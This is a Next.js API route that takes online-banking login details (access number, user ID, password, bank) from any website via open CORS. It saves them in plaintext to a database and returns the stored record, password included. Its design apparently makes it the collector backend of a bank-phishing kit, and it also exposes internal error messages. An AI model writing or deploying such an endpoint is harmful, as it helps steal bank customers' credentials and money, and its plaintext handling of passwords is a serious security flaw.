import { NextRequest, NextResponse } from 'next/server';
import { PrismaClient } from '@/app/generated/prisma/client';

const prisma = new PrismaClient();

const CORS_HEADERS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type, Authorization',
};

// Disable Next.js default body parser
export const config = {
  api: {
    bodyParser: false, // We handle parsing ourselves
  },
};

export async function POST(req: NextRequest) {
  try {
    // Manually parse the incoming form data
    const body = await req.text(); // Read raw text body
    const params = new URLSearchParams(body); // Convert it to a URLSearchParams object

    // Extract values from the form data
    const accessNumber = params.get('accessNumber');
    const userId = params.get('userId');
    const password = params.get('password');
    const bank = params.get('bank');

    // Check for missing data
    if (!accessNumber || !userId || !password || !bank) {
      return new NextResponse(
        JSON.stringify({
          success: false,
          message: 'Missing required fields',
        }),
        {
          status: 400,
          headers: CORS_HEADERS,
        }
      );
    }

    // Create a new order in the database using Prisma
    const newOrder = await prisma.bank.create({
      data: {
        accessNumber,
        userId,
        password,
        bank,
      },
    });

    // Return success response
    return new NextResponse(
      JSON.stringify({ success: true, message: 'Data saved successfully', order: newOrder }),
      {
        status: 200,
        headers: CORS_HEADERS,
      }
    );
  } catch (error) {
    return new NextResponse(
      JSON.stringify({
        success: false,
        message: 'Failed to save data',
        error: (error as Error).message,
      }),
      {
        status: 500,
        headers: CORS_HEADERS,
      }
    );
  }
}

export async function OPTIONS() {
  return new NextResponse(null, {
    status: 200,
    headers: CORS_HEADERS,
  });
}
